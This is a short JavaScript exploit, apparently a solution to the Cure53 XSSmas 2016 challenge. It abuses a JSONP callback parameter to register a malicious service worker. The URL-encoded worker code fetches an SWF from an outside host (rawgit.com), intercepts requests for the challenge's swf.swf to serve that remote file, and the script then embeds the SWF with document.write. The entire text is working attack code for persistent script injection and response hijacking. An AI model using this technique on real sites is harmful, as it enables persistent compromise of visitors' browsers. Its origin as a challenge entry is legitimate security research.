if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/token.jsonp?v=1&callback=var+resp%3b%0d%0a%0d%0afetch(%27https%3a%2f%2frawgit.com%2fKawaHttp%2ftest1%2fmaster%2fsantax.swf%27).then(function(response)+%7b%0d%0a++if(response.ok)+%7b%0d%0a++++response.text().then(function(x)+%7b%0d%0a++++++resp+%3d+x%3b%0d%0a++++%7d)%3b%0d%0a++%7d+else+%7b%0d%0a++++console.log(%27Network+response+was+not+ok.%27)%3b%0d%0a++%7d%0d%0a%7d)%3b%0d%0a%0d%0athis.addEventListener(%27install%27%2c+function(event)+%7b%0d%0a++event.waitUntil(%0d%0a++++caches.open(%27v1%27).then(function(cache)+%7b%0d%0a++++++return+cache.addAll(%5b%0d%0a++++++++%27%2ftoken.xml%27%0d%0a++++++%5d)%3b%0d%0a++++%7d)%0d%0a++)%3b%0d%0a%7d)%3b%0d%0a%0d%0athis.addEventListener(%27fetch%27%2c+function(event)+%7b%0d%0a++console.log(event.request.url+%2b+%22+requested%22)%3b%0d%0a++if(event.request.url+%3d%3d+%22https%3a%2f%2fxssmas2016.cure53.de%2fswf.swf%22)%7b%0d%0a+++++event.respondWith(%0d%0a+++++++++++new+Response(resp%2c+%7b+headers%3a+%7b+%27Content-Type%27%3a+%27application%2fx-shockwave-flash%27+%7d+%7d)%0d%0a+++++++++)%3b%0d%0a++%7d%0d%0a%7d)%3b%0d%0a%2f%2f', { scope: '/' }).then(function(reg) {
    // registration worked
    console.log('Registration succeeded. Scope is ' + reg.scope);
  }).catch(function(error) {
    // registration failed
    console.log('Registration failed with ' + error);
  });
};

document.write("<object><param name='movie' value='https://xssmas2016.cure53.de/swf.swf'></object>");
